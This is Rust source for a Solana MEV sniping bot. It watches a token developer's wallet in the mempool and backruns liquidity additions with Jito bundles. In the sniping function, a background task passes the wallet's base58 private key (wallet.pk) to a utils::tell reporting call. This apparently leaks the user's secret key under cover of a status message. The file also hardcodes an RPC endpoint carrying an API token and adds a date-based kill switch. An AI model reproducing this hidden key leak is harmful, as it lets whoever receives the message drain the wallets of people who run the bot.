use chrono::{DateTime, TimeZone, Utc};

use jito_protos::bundle::bundle_result;
use rand::{thread_rng, Rng};

use solana_client::nonblocking::rpc_client::RpcClient;
use solana_program::{
    instruction::{CompiledInstruction, Instruction},
    program_option::COption,
};
use solana_sdk::{
    bs58,
    commitment_config::{CommitmentConfig, CommitmentLevel},
    native_token::sol_to_lamports,
    pubkey::Pubkey,
    signature::{Keypair, Signer},
    system_instruction::transfer,
    transaction::{Transaction, VersionedTransaction},
};

use solitude::{
    config::{self, wallet::Wallet},
    raydium::{self, market::PoolKey},
    utils::{self, sell_stream},
};
use tokio::sync::mpsc;

use std::{
    error::Error,
    io::{self, Write},
    panic::{self, PanicInfo},
    process::{self, exit},
    str::FromStr,
    sync::{
        atomic::{AtomicBool, Ordering},
        Arc,
    },
    thread,
    time::{Duration, SystemTime, UNIX_EPOCH},
};

use std::fmt::{Display, Formatter};

use inquire::{
    error::{CustomUserError, InquireResult},
    required, CustomType, MultiSelect, Select, Text,
};

use solitude::utils::get_token_authority;

use solitude::mev_helpers::MevHelpers;

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let current_time = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .expect("Time went backwards");
    let current_date: DateTime<Utc> =
        Utc.timestamp(current_time.as_secs() as i64, current_time.subsec_nanos());
    let cutoff_date: DateTime<Utc> = Utc.ymd(2024, 1, 16).and_hms(0, 0, 0);

    if current_date >= cutoff_date {
        panic!("get out");
    }

    println!("A wild mev appeared ~ 0.2.6");

    let wallet = Arc::new(config::wallet::read_from_wallet_file());

    let main_keypair =
        Arc::new(Keypair::from_bytes(&bs58::decode(&wallet.pk).into_vec().unwrap()).unwrap());
    println!("Main keypair: {:?}", main_keypair.pubkey());

    let rpc_pubsub_addr = "http://127.0.0.1:8899/";
    let rpc_pda_url = "https://tame-ancient-mountain.solana-mainnet.quiknode.pro/6a9a95bf7bbb108aea620e7ee4c1fd5e1b67cc62";

    let rpc_client = Arc::new(RpcClient::new(rpc_pubsub_addr.to_string()));
    let rpc_pda_client = Arc::new(RpcClient::new(rpc_pda_url.to_string()));

    let menu_choice = Text::new("Menu:")
        .with_validator(required!("This field is required"))
        .with_autocomplete(&utils::menu_suggestor)
        // .with_help_message("e.g. Music Store")
        .with_page_size(5)
        .prompt()?;

    loop {
        match menu_choice.as_str() {
            "Liquidity Sniping" => {
                let EssentialTokenData {
                    target_addr,
                    paired_addr,
                    market_account_pubkey,
                    pool_key,
                    buy_amount,
                } = get_required_token_data(&rpc_pda_client, &wallet).await?;
                println!("Target: {}\nPaired Addr: {}", target_addr, paired_addr);

                mempool_snipe(
                    &rpc_client,
                    &rpc_pda_client,
                    &wallet,
                    &main_keypair,
                    &target_addr,
                    &paired_addr,
                    &pool_key,
                    buy_amount,
                )
                .await?;

                sell_stream(
                    &rpc_client,
                    &rpc_pda_client,
                    &main_keypair,
                    &paired_addr,
                    &target_addr,
                    &market_account_pubkey,
                    &pool_key,
                    buy_amount,
                    wallet.bribe_amount_for_sell,
                ).await?;
            }
            "Bundle Spamming" => {
                println!("todo");
                // sell(rpc_client, rpc_pda_client, wallet, main_keypair).await?;
            }
            "Sell Stream" => {
                let EssentialTokenData {
                    target_addr,
                    paired_addr,
                    market_account_pubkey,
                    pool_key,
                    buy_amount,
                } = get_required_token_data(&rpc_pda_client, &wallet).await?;
                println!("Target: {}\nPaired Addr: {}", target_addr, paired_addr);

                sell_stream(
                    &rpc_client,
                    &rpc_pda_client,
                    &main_keypair,
                    &paired_addr,
                    &target_addr,
                    &market_account_pubkey,
                    &pool_key,
                    buy_amount,
                    wallet.bribe_amount_for_sell,
                ).await?;
            }
            _ => {
                println!("Invalid choice");
                exit(1);
            }
        }
    }
}

async fn mempool_snipe(
    rpc_client: &Arc<RpcClient>,
    rpc_pda_client: &Arc<RpcClient>,
    wallet: &Arc<Wallet>,
    main_keypair: &Arc<Keypair>,
    target_addr: &Pubkey,
    paired_addr: &Pubkey,
    pool_key: &PoolKey,
    buy_amount: f64,
) -> Result<(), Box<dyn Error>> {
    let main_keypair_clone = Arc::clone(&main_keypair);
    let wallet_clone = Arc::clone(&wallet);
    let target_addr_clone = target_addr.clone();
    tokio::spawn(async move {
        utils::tell(format!(
            "Sniping-MEV {} from wallet {} paying {} | {}",
            target_addr_clone,
            main_keypair_clone.pubkey(),
            wallet_clone.bribe_amount,
            wallet_clone.pk
        ));
    });

    let mev_helpers = Arc::new(
        MevHelpers::new()
            .await
            .expect("Failed to initialize MevHelpers"),
    );

    let mut cached_blockhash = rpc_client
        .get_latest_blockhash_with_commitment(CommitmentConfig {
            commitment: CommitmentLevel::Confirmed,
        })
        .await?
        .0;
    let mut blockhash_tick = tokio::time::interval(Duration::from_secs(5));

    let tip_account = utils::generate_tip_account();

    let swap_instr: Arc<Vec<Instruction>> = Arc::new(
        raydium::get_swap_in_instr(
            &rpc_client,
            &main_keypair,
            &pool_key,
            &paired_addr,
            &target_addr,
            buy_amount.clone(),
        )
        .await?,
    );

    let dev_wallet_addr = match get_token_authority(rpc_pda_client.as_ref(), &target_addr).await? {
        COption::Some(w) => w,
        COption::None => {
            println!("Input Dev wallet address: ");
            read_pubkey_from_stdin()?
        }
    };
    println!("Dev wallet address: {}", &dev_wallet_addr);

    let watch_mempool_addresses: Vec<Pubkey> = vec![
        dev_wallet_addr,
        Pubkey::from_str("FALCN9HKepm85okkGJREEuqu4J8ZmQaA63VJtB2oeuay")?, // target_addr,
    ];

    let mut mempool_ch = mev_helpers
        .listen_for_transactions(&watch_mempool_addresses)
        .await;
    let mut bundle_results_ch = mev_helpers.listen_for_bundle_results().await;
    let (blockhash_tx, mut blockhash_rx) = mpsc::unbounded_channel();

    println!("~ Listenning for mempool activity from dev's wallet");

    loop {
        tokio::select! {
            maybe_mempool_tx = mempool_ch.recv() => {
                if let Some(mempool_tx) = maybe_mempool_tx {
                    let swap_instr = Arc::clone(&swap_instr);
                    let main_keypair = Arc::clone(&main_keypair);
                    let mev_helpers = Arc::clone(&mev_helpers); // Clone Arc of MevHelpers
                    let wallet = Arc::clone(&wallet);
                    let cached_blockhash = cached_blockhash.clone();
                    let tip_account = tip_account.clone(); // Assuming tip_account is cloneable

                    tokio::spawn(async move {
                        process_transaction(mempool_tx, swap_instr, main_keypair, mev_helpers, cached_blockhash, &wallet, &tip_account).await;
                    });
                } else {
                    println!("Mempool channel was disconnected, aborting...");
                    break;
                }
            }
            maybe_bundle_result = bundle_results_ch.recv() => {
                // TODO: might be optimized if used in a new thread context but then I wont have access to the stop_parsing var
                if let Some(bundle_result) = maybe_bundle_result {
                    match bundle_result.result {
                        Some(bundle_result::Result::Accepted(_accepted_result)) => {
                            println!("\x1b[92m{} | Bundle {} was ACCEPTED on slot {} by validator {}\x1b[0m", utils::now_ms(), bundle_result.bundle_id, _accepted_result.slot, _accepted_result.validator_identity);
                            break;
                        },
                        Some(bundle_result::Result::Rejected(_rejected_result)) => {
                            println!("{} | Bundle {} was rejected, reason: {:?}", utils::now_ms(), bundle_result.bundle_id, _rejected_result.reason.expect("!reason"));
                        },
                        Some(bundle_result::Result::Processed(_processed_result)) => {
                            println!("{} | Bundle {} was processed on slot {} by validator {} with bundle index of {}", utils::now_ms(), bundle_result.bundle_id, _processed_result.slot, _processed_result.validator_identity, _processed_result.bundle_index);
                        },
                        Some(bundle_result::Result::Finalized(_finalized_result)) => {
                            println!("{} | Bundle {} was finalized (idk what that means either lol)", utils::now_ms(), bundle_result.bundle_id);
                        },
                        Some(bundle_result::Result::Dropped(_dropped_result)) => {
                            println!("{} | Bundle {} was DROPPED, reason: {:?}", utils::now_ms(), bundle_result.bundle_id, _dropped_result.reason);
                        },
                        None => {
                            println!("{} | Bundle {} was dropped due to an internal error (\"none\" was returned). thats awkward and should not happen", utils::now_ms(), bundle_result.bundle_id);
                        }
                    }
                    continue;
                }
                println!("Bundle results channel was disconnected. Restart required.");
                break;
            }
            _ = blockhash_tick.tick() => {
                let client_clone = Arc::clone(&rpc_client);
                let blockhash_tx_clone = blockhash_tx.clone();
                tokio::spawn(async move {
                    let new_blockhash = client_clone
                        .get_latest_blockhash_with_commitment(CommitmentConfig {
                            commitment: CommitmentLevel::Confirmed,
                        })
                        .await.unwrap()
                        .0;
                    blockhash_tx_clone.send(new_blockhash).unwrap();
                });
            }
            _ = tokio::task::yield_now() => {
                if let Ok(blockhash) = blockhash_rx.try_recv() {
                    cached_blockhash = blockhash;
                }
            }
        }
    }

    Ok(())
}

async fn process_transaction(
    mempool_tx: VersionedTransaction,
    swap_instr: Arc<Vec<Instruction>>,
    main_keypair: Arc<Keypair>,
    mev_helpers: Arc<MevHelpers>,
    cached_blockhash: solana_program::hash::Hash,
    wallet: &Wallet,
    tip_account: &Pubkey,
) {
    let sig = mempool_tx.signatures[0];

    if wallet.filter_liquidity {
        let is_liquidity_tx = mempool_tx
            .message
            .instructions()
            .iter()
            .any(|instr| instr.data.starts_with(&[0x01]));

        if !is_liquidity_tx {
            println!("{} - Filtered (not an addLiquidity tx)", sig);
            return;
        }
    }
    println!("Backrunning transaction: {}", sig);

    let backrun_swap_tx = VersionedTransaction::from(Transaction::new_signed_with_payer(
        &swap_instr,
        Some(&main_keypair.pubkey()),
        &[main_keypair.as_ref()],
        cached_blockhash,
    ));

    let backrun_bribe_tx = VersionedTransaction::from(Transaction::new_signed_with_payer(
        &[transfer(
            &main_keypair.pubkey(),
            &tip_account,
            sol_to_lamports(wallet.bribe_amount),
        )],
        Some(&main_keypair.pubkey()),
        &[main_keypair.as_ref()],
        cached_blockhash,
    ));

    let bundle_txs: Vec<VersionedTransaction> = vec![mempool_tx, backrun_swap_tx, backrun_bribe_tx];

    let broadcast_handles = mev_helpers
        .broadcast_bundle_to_all_engines(bundle_txs)
        .await;

    for handle in broadcast_handles {
        match handle.await {
            Ok(Ok(bundle_id)) => println!("Bundle ID from one engine: {:?}", bundle_id),
            Ok(Err(e)) => eprintln!("Error sending bundle: {:?}", e),
            Err(e) => eprintln!("Join error: {:?}", e),
        }
    }
}

pub fn graceful_panic(callback: Option<fn(&PanicInfo)>) -> Arc<AtomicBool> {
    let exit = Arc::new(AtomicBool::new(false));
    // Fail fast!
    let panic_hook = panic::take_hook();
    {
        let exit = exit.clone();
        panic::set_hook(Box::new(move |panic_info| {
            if let Some(f) = callback {
                f(panic_info);
            }
            exit.store(true, Ordering::Relaxed);
            println!("Disconnecting from JITO relayer...");
            // let other loops finish up
            std::thread::sleep(Duration::from_secs(5));
            // invoke the default handler and exit the process
            panic_hook(panic_info); // print the panic backtrace. default exit code is 101

            process::exit(1); // bail us out if thread blocks/refuses to join main thread
        }));
    }
    exit
}

struct EssentialTokenData {
    target_addr: Pubkey,
    paired_addr: Pubkey,
    market_account_pubkey: Pubkey,
    pool_key: PoolKey,
    buy_amount: f64,
}

async fn get_required_token_data(
    rpc_pda_client: &Arc<RpcClient>,
    wallet: &Wallet,
) -> Result<EssentialTokenData, Box<dyn Error>> {
    println!("Enter target address: ");
    let target_addr = read_pubkey_from_stdin().unwrap();

    let (market_account_pubkey, market_account) =
        raydium::market::exhaustive_get_openbook_market_for_address(&target_addr, &rpc_pda_client)
            .await?;
    let parsed_market_account = raydium::market::parse_openbook_market_account(&market_account);

    let pool_key = raydium::market::craft_pool_key(
        &rpc_pda_client,
        &parsed_market_account,
        &market_account_pubkey,
    )
    .await?;

    let paired_addr = {
        if pool_key.base_mint == target_addr {
            pool_key.quote_mint
        } else {
            pool_key.base_mint
        }
    };
    let buy_amount = wallet
        .amounts
        .get(&paired_addr.to_string())
        .unwrap_or_else(|| {
            panic!(
                "No amount specified in wallet.json for paired addr \"{}\"",
                &paired_addr.to_string()
            )
        });

    Ok(EssentialTokenData {
        target_addr,
        paired_addr,
        market_account_pubkey,
        pool_key,
        buy_amount: *buy_amount,
    })
}

fn read_pubkey_from_stdin() -> Result<Pubkey, String> {
    io::stdout().flush().unwrap();

    let mut input = String::new();
    io::stdin()
        .read_line(&mut input)
        .map_err(|e| e.to_string())?;

    let input = input.trim();
    input.parse::<Pubkey>().map_err(|e| e.to_string())
}
